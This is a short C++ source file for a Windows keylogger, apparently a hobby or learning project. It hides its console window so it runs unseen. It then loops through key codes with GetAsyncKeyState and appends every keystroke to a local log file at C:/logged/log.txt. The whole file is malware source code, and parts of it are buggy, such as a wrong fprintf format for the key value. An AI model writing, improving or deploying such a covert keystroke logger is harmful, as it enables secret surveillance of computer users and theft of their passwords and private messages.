

#include <iostream>
#include<fstream>
#include <Windows.h>
#include <time.h>



#include "one_time_creation.h"

#pragma warning(disable : 4996)

//^this disables the error message about the key saving method not being safe

void logfile(int key)
{
	//TODO: create a new path for the logging file
	
	FILE* log;
	log = fopen("C:/logged/log.txt", "a+");//a+ to create a file if it doesnt exist and writes at then end.
	fprintf(log, "%s", &key);
	fclose(log);
	
	
	
}


void hideconsole() 
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);

	//hides the console window to keep the application hidden



}

int main()
{	
	path_creation();

	hideconsole();




	bool running = true;
	while (running == true)
	{
		//using ascii
		int i = 0;
		for (i > 8; i <= 255; i++) // starts and end of the mainly used ascii char
		{

			if (GetAsyncKeyState(i)== -32767)
			{
				logfile(i);
				//TODO improve saving mechinishm 
				//add special characters ect...


			}
		}
		

	}


	
	
	return 0;
}
